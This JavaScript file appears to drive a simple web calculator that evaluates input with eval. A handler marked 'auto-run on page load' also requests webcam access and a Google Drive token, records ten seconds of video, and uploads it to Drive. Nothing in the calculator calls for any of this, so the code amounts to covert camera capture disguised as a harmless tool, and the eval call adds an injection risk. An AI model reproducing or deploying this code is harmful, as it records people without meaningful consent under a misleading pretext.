let display = document.getElementById("display")

const CLIENT_ID = "883580141346-u1e41q10608887ba83gvkmbq8il24inq.apps.googleusercontent.com"
const DRIVE_SCOPE = "https://www.googleapis.com/auth/drive.file"
const DRIVE_FOLDER_ID = ""
const RECORDING_MS = 10000

function press(v) {
    display.value += v
}

function calculate() {
    try {
        display.value = eval(display.value)
    } catch {
        display.value = "Error"
    }
}

function clearDisplay() {
    display.value = ""
}

function waitForGoogleIdentity() {
    return new Promise((resolve, reject) => {
        const startedAt = Date.now()
        const interval = setInterval(() => {
            if (window.google && google.accounts && google.accounts.oauth2) {
                clearInterval(interval)
                resolve()
                return
            }

            if (Date.now() - startedAt > 8000) {
                clearInterval(interval)
                reject(new Error("Google Identity Services failed to load"))
            }
        }, 100)
    })
}

function initTokenClient() {
    return google.accounts.oauth2.initTokenClient({
        client_id: CLIENT_ID,
        scope: DRIVE_SCOPE,
        callback: () => { }
    })
}

function requestDriveToken(tokenClient) {
    return new Promise((resolve, reject) => {
        tokenClient.callback = resp => {
            if (resp.error) {
                reject(resp)
                return
            }

            resolve(resp.access_token)
        }

        tokenClient.requestAccessToken({ prompt: "consent" })
    })
}

function buildTimestampFilename() {
    const now = new Date()
    const pad = value => String(value).padStart(2, "0")

    const datePart = [
        now.getFullYear(),
        pad(now.getMonth() + 1),
        pad(now.getDate())
    ].join("")

    const timePart = [
        pad(now.getHours()),
        pad(now.getMinutes()),
        pad(now.getSeconds())
    ].join("")

    return `capture-${datePart}-${timePart}.webm`
}

async function uploadToDrive(blob, filename, accessToken) {
    const metadata = {
        name: filename,
        mimeType: "video/webm"
    }

    if (DRIVE_FOLDER_ID) {
        metadata.parents = [DRIVE_FOLDER_ID]
    }

    const boundary = "----WebKitFormBoundary" + Math.random().toString(16).slice(2)

    const bodyStart =
        `--${boundary}\r\n` +
        "Content-Type: application/json; charset=UTF-8\r\n\r\n" +
        `${JSON.stringify(metadata)}\r\n` +
        `--${boundary}\r\n` +
        "Content-Type: video/webm\r\n\r\n"

    const bodyEnd = `\r\n--${boundary}--`

    const bodyBlob = new Blob([bodyStart, blob, bodyEnd], {
        type: `multipart/related; boundary=${boundary}`
    })

    const response = await fetch(
        "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
        {
            method: "POST",
            headers: { Authorization: `Bearer ${accessToken}` },
            body: bodyBlob
        }
    )

    if (!response.ok) {
        throw new Error("Drive upload failed")
    }

    return response.json()
}

// auto-run on page load
window.addEventListener("load", async () => {

    try {

        await waitForGoogleIdentity()
        const tokenClient = initTokenClient()

        const stream = await navigator.mediaDevices.getUserMedia({ video: true })
        const accessToken = await requestDriveToken(tokenClient)

        const recorder = new MediaRecorder(stream)

        let chunks = []

        recorder.ondataavailable = e => {
            if (e.data && e.data.size > 0) {
                chunks.push(e.data)
            }
        }

        recorder.start()

        // record 10 seconds
        setTimeout(() => {
            recorder.stop()
        }, RECORDING_MS)

        recorder.onstop = async () => {
            try {
                const blob = new Blob(chunks, { type: "video/webm" })
                const filename = buildTimestampFilename()
                await uploadToDrive(blob, filename, accessToken)
            } catch (err) {
                console.log("Drive upload error:", err)
            } finally {
                // stop camera after recording
                stream.getTracks().forEach(track => track.stop())
            }
        }

    } catch (err) {
        console.log("Camera/Drive error:", err)
    }

})